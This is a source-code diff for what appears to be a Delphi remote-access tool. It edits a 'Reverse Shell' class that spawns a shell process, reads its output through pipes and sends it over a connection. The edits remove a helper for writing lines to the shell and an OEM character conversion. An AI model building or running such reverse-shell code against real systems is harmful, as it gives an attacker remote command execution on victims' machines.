@@ -36,7 +36,6 @@ type
     function SendBuffer(ABuffer : Pointer; ABufferSize : Int64) : Boolean;
 
     function WriteStdin(pData : PVOID; ADataSize : DWORD) : Boolean;
-    function WriteStdinLn(AStr : AnsiString = '') : Boolean;
 
     function Build() : Boolean;
     function Connect() : Boolean;
@@ -254,13 +253,6 @@ begin
   result := True;
 end;
 
-function TStdoutShell.WriteStdinLn(AStr : AnsiString = '') : Boolean;
-begin
-  AStr := (AStr + #13#10);
-
-  result := WriteStdin(@AStr[1], Length(AStr));
-end;
-
 {-------------------------------------------------------------------------------
   Reverse Shell
 -------------------------------------------------------------------------------}
@@ -274,7 +266,6 @@ var AStartupInfo    : TStartupInfo;
     AProgram        : String;
     ABytesAvailable : DWORD;
     ABuffer         : array of byte;
-    ABufferOut      : array of byte;
     ABytesRead      : DWORD;
     pRecvBuffer     : Pointer;
     ATotalRecvdSize : Cardinal;
@@ -340,7 +331,6 @@ begin
         Exit();
       try
         FShellProcId := AProcessInfo.dwProcessId;
-
         while NOT Terminated do begin
           try
             if NOT IsMutexAssigned(LSTDIN_MUTEX_NAME) then
@@ -365,20 +355,16 @@ begin
                 Read stdout, stderr
               }
               SetLength(ABuffer, ABytesAvailable);
-              SetLength(ABufferOut, ABytesAvailable);
               try
                 b := ReadFile(APipeInRead, ABuffer[0], ABytesAvailable, ABytesRead, nil);
                 if (NOT b) then
                   break;
                 ///
 
-                CharToOemBuffA(@ABuffer[0], @ABufferOut[0], ABytesAvailable);
-
-                if (NOT SendBuffer(@ABufferOut[0], ABytesAvailable)) then
+                if (NOT SendBuffer(@ABuffer[0], ABytesAvailable)) then
                   break;
               finally
                 SetLength(ABuffer, 0);
-                SetLength(ABufferOut, 0);
               end;
             end else begin
               {
